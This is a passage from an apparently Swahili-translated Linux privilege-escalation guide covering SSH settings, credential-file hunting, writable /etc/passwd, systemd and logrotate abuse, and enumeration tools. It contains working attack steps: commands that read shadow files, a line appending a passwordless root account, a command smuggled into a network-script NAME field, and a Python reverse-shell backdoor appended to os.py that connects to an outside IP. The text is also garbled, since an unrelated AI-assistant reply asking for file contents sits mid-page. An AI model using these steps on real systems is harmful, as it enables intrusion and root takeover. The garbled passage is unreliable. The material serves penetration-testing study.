Bug hii inatokea wakati wa kuunda ssh key mpya katika OS hizo, kwa sababu **palikuwa na mabadiliko 32,768 tu yaliyowezekana**. Hii ina maana kwamba uwezekano wote unaweza kukokotolewa na **ukiwa na ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata possibilities zilizokokotolewa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Thamani za usanidi zinazovutia

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### PermitRootLogin

Inaeleza kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia akitumia password na private key
- `without-password` or `prohibit-password`: root anaweza kuingia kwa private key pekee
- `forced-commands-only`: Root anaweza kuingia tu kwa private key na ikiwa options za commands zimeainishwa
- `no` : hapana

### AuthorizedKeysFile

Inaeleza mafaili yanayohifadhi public keys ambazo zinaweza kutumika kwa user authentication. Inaweza kujumuisha tokens kama `%h`, zitakazobadilishwa na home directory. **Unaweza kuonyesha absolute paths** (zinaanza kwa `/`) au **relative paths kutoka home directory ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Mipangilio hiyo itaonyesha kwamba ikiwa utajaribu kuingia kwa kutumia **private** key ya mtumiaji "**testusername**", ssh italinganisha public key ya key yako na zile zilizoko katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inawezesha wewe **use your local SSH keys instead of leaving keys** (without passphrases!) kukaa kwenye seva yako. Kwa hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** iliyoko kwenye **initial host**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama hii:
```
Host example.com
ForwardAgent yes
```
Tambua kwamba ikiwa `Host` ni `*`, kila wakati mtumiaji anaporuka kwenda mashine tofauti, host hiyo itaweza kufikia keys (ambazo ni suala la usalama).

Faili `/etc/ssh_config` inaweza **kubadilisha** **chaguzi** hizi na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa kutumia keyword `AllowAgentForwarding` (default ni allow).

Ikiwa utagundua kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwa sababu **huenda ukaweza kuitumia vibaya ili escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili Zinazovutia

### Faili za Profaili

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripti zinazotekelezwa wakati mtumiaji anaendesha shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kubadilisha yoyote kati yao unaweza escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa skripti yoyote isiyokuwa ya kawaida ya profile imepatikana, unapaswa kuikagua kwa **maelezo nyeti**.

### Passwd/Shadow Files

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` huenda zikiwa na majina tofauti au kunaweza kuwa na nakala za chelezo. Kwa hivyo inashauriwa **kutafuta zote** na **kuangalia ikiwa unaweza kuzisoma** ili kuona **ikiwa kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Wakati mwingine unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa nayo)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd inayoweza kuandikwa

Kwanza, tengeneza password kwa kutumia mojawapo ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don’t have the file contents. Please paste the contents of src/linux-hardening/privilege-escalation/README.md (or confirm I should fetch it), and tell me whether you want:

- the README translated to Swahili with a line added that contains the generated password for user `hacker` (text-only change), or
- commands to actually create the system user `hacker` on a Linux host (I’ll need to know whether you have sudo/root access and which distro).

If you want me to generate a password now, tell me desired length/complexity; otherwise I can generate a secure password (e.g. 16 chars, mixed). Which do you prefer?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Mbali na hayo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nenosiri.\
ONYO: unaweza kupunguza usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imeitwa `/etc/spwd.db`.

Unapaswa kuangalia ikiwa unaweza **kuandika kwenye baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika kwenye baadhi ya **service configuration file**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kubadilisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itaendeshwa mara ijayo tomcat itakapowashwa.

### Angalia Mafolda

Folda zifuatazo zinaweza kuwa na chelezo au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Pengine hautaweza kusoma ile ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Isiyo ya Kawaida/Owned mafaili
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika za hivi punde
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafayela
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripti/Binari katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zenye maneno ya siri

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazowezekana ambazo zinaweza kuwa na maneno ya siri**.\
**Zana nyingine ya kuvutia** ambayo unaweza kutumia kwa hili ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu ya chanzo wazi inayotumika kupata maneno mengi ya siri yaliyohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logi

Ikiwa unaweza kusoma logi, unaweza kupata **taarifa za kuvutia/za siri ndani yao**. Kadri logi inavyokuwa ya ajabu zaidi, ndivyo itakavyokuwa ya kuvutia zaidi (huenda).\
Pia, baadhi ya mipangilio **mbaya** (backdoored?) ya **rejista za ukaguzi** yanaweza kukuruhusu **kurekodi maneno ya siri** ndani ya rejista za ukaguzi kama ilivyoelezewa kwenye chapisho hiki: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/.
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili kusoma logs, kundi [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitasadia sana.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia faili zinazojumuisha neno "**password**" katika **jina** au ndani ya **maudhui**, na pia kuangalia IPs na emails ndani ya logs, au hashes regexps.\\ Sitataja hapa jinsi ya kufanya yote haya lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili zinazoweza kuandikwa

### Python library hijacking

Iwapo unajua **wapi** script ya python itatekelezwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **kubadilisha python libraries**, unaweza kubadilisha library ya OS na kuiweka backdoor (ikiwa unaweza kuandika mahali script ya python itatekelezwa, nakili na ubandike library ya os.py).

Ili **backdoor the library** ongeza tu mwishoni mwa library ya os.py mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Udhaifu katika `logrotate` unaruhusu watumiaji wenye **write permissions** kwenye faili ya logi au kwenye directories zake za mzazi kupata vibali vilivyoongezeka. Hii ni kwa sababu `logrotate`, mara nyingi ikifanya kazi kama **root**, inaweza kudhibitiwa ili kuendesha faili yoyote, hasa katika directories kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa sio tu katika _/var/log_ bali pia katika directory yoyote ambapo rotation ya logi inatekelezwa.

> [!TIP]
> Udhaifu huu unaathiri `logrotate` toleo `3.18.0` na zile za zamani

Maelezo zaidi kuhusu udhaifu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni karibu sawa na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hivyo kila unapogundua kuwa unaweza kubadilisha logi, angalia nani anayesimamia hizo logi na angalia kama unaweza kupandishia vibali kwa kubadilisha logi kuwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Marejeo ya udhaifu:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are ~sourced~ on Linux by Network Manager (dispatcher.d).

Kwenye kesi yangu, `NAME=` inayotolewa katika scripts hizi za mtandao haitiwi vizuri. **Ikiwa una nafasi tupu (white/blank space) katika jina mfumo unajaribu kutekeleza sehemu iliyofuata baada ya nafasi hiyo.** **Hii inamaanisha kwamba kila kitu baada ya nafasi ya kwanza kinaendeshwa kama root.**

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktori `/etc/init.d` ni sehemu ya kuhifadhi **scripts** za System V init (SysVinit), mfumo wa jadi wa usimamizi wa services wa Linux. Inajumuisha scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` za services. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zilizopo katika `/etc/rc?.d/`. Njia mbadala katika mfumo wa Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya wa **service management** uliotangazwa na Ubuntu, unaotumia faili za usanidi kwa kazi za usimamizi wa services. Licha ya mabadiliko kwenda Upstart, scripts za SysVinit bado zinatumika pamoja na usanidi wa Upstart kutokana na tabaka la compatibility ndani ya Upstart.

**systemd** inatokea kama msimamizi wa kisasa wa initialization na services, ikitoa vipengele vya juu kama kuanzisha daemons kwa ombi, usimamizi wa automount, na snapshots za hali ya mfumo. Inapanga faili ndani ya `/usr/lib/systemd/` kwa packages za distribution na `/etc/systemd/system/` kwa mabadiliko ya wasimamizi, ikifanya kazi za usimamizi wa mfumo kuwa rahisi.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks kawaida hu-hook syscall ili kufichua uwezo wa kernel uliopatikana kwa manager wa userspace. Uthibitishaji dhaifu wa manager (mfano, checks za signature zinazotegemea FD-order au skimu za maneno ya siri hafifu) unaweza kumwezesha app ya ndani kuiga manager na escalate to root kwenye vifaa vilivyoshindwa au tayari vime-root. Jifunze zaidi na maelezo ya exploitation hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery katika VMware Tools/Aria Operations inaweza kutoa binary path kutoka kwa process command lines na kuiendesha na -v chini ya muktadha wenye ruhusa. Patterns yenye kuruhusu (mfano, kutumia \S) zinaweza kufanana na listeners waliowekwa na attacker katika maeneo ya writable (mfano, /tmp/httpd), na kusababisha execution as root (CWE-426 Untrusted Search Path).

Jifunze zaidi na uone muundo wa jumla unaoweza kutumika kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
